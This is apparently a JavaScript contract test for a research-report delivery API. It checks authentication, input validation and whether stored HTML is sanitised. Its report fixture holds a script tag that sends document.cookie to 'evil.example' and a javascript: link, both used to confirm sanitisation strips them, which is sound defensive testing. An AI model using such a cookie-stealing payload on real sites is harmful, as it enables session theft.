// The research delivery route's contract, request by request, against the running app (see
// with-app.sh). Seeds one research post whose session is still researching, then PUTs to
// /api/reader/research/<id> the way a research session would — and a few ways it must not work —
// and prints each answer, then what the post holds afterwards. Deterministic: fixed ids, no clocks.
const { APP_URL, MOCK_URL, INGEST_API_KEY, RESEARCH_DELIVERY_KEY } = process.env;
const POST_ID = '5e5e5e5e-5e5e-4e5e-8e5e-5e5e5e5e5e5e';
const NEWSLETTER_ID = '6f6f6f6f-6f6f-4f6f-8f6f-6f6f6f6f6f6f';

await fetch(`${MOCK_URL}/__mock__/seed`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    readerPublications: [{ id: '7a7a7a7a-7a7a-4a7a-8a7a-7a7a7a7a7a7a', name: 'Second Thoughts' }],
    readerPosts: [
      {
        id: POST_ID,
        source: 'research',
        title: 'Is a cold-climate heat pump worth it for our Chicago house?',
        research_brief: 'Is a cold-climate heat pump worth it for our Chicago house?',
        research_state: 'researching',
        research_attempts: 1,
      },
      {
        id: NEWSLETTER_ID,
        publication_id: '7a7a7a7a-7a7a-4a7a-8a7a-7a7a7a7a7a7a',
        title: 'Most productivity advice is survivorship bias',
      },
    ],
  }),
});

const REPORT = [
  '# Is a cold-climate heat pump worth it for our Chicago house?',
  '',
  '*Researched 2026-09-29 · 2 sources*',
  '',
  '## Bottom line',
  '',
  'Probably yes, if the furnace has under five years left [1][2].',
  '',
  '<script>fetch("https://evil.example/?c=" + document.cookie)</script>',
  '',
  'A [link an injected page asked for](javascript:alert(1)) and a [real one](https://example.org/rebates).',
].join('\n');

async function put(label, id, headers, body) {
  const response = await fetch(`${APP_URL}/api/reader/research/${id}`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });
  const answer = await response.json();
  console.log(`${label.padEnd(48)} → ${response.status} ${JSON.stringify(answer.error ?? answer)}`);
}

const key = { Authorization: `Bearer ${RESEARCH_DELIVERY_KEY}` };
await put('no key', POST_ID, {}, { report: REPORT });
await put('the ingest key (it can create items, not this)', POST_ID, { 'x-api-key': INGEST_API_KEY }, { report: REPORT });
await put('the research key, a blank report', POST_ID, key, { report: '   ' });
await put('the research key, not JSON', POST_ID, key, 'not json');
await put('the research key, an unknown post', '00000000-0000-4000-8000-000000000000', key, { report: REPORT });
await put('the research key, a newsletter', NEWSLETTER_ID, key, { report: REPORT });
await put('the research key, the report', POST_ID, key, { report: REPORT });
await put('the research key, a second report', POST_ID, key, { report: 'A later run.' });

const state = await (await fetch(`${MOCK_URL}/__mock__/state`)).json();
const post = state.readerPosts.find((row) => row.id === POST_ID);
console.log('');
console.log('stored post:');
for (const column of ['research_state', 'summary_state', 'word_count', 'summarize_attempts']) {
  console.log(`  ${column}: ${JSON.stringify(post[column])}`);
}
console.log(`  delivered_at set, received_at moved to it: ${post.research_delivered_at !== null && post.received_at === post.research_delivered_at}`);
console.log(`  text is the markdown as sent: ${post.text === REPORT}`);
console.log(`  html contains <script>: ${post.html.includes('<script')}`);
console.log(`  html contains javascript:: ${post.html.includes('javascript:')}`);
console.log(`  html keeps the real link: ${post.html.includes('<a href="https://example.org/rebates">real one</a>')}`);
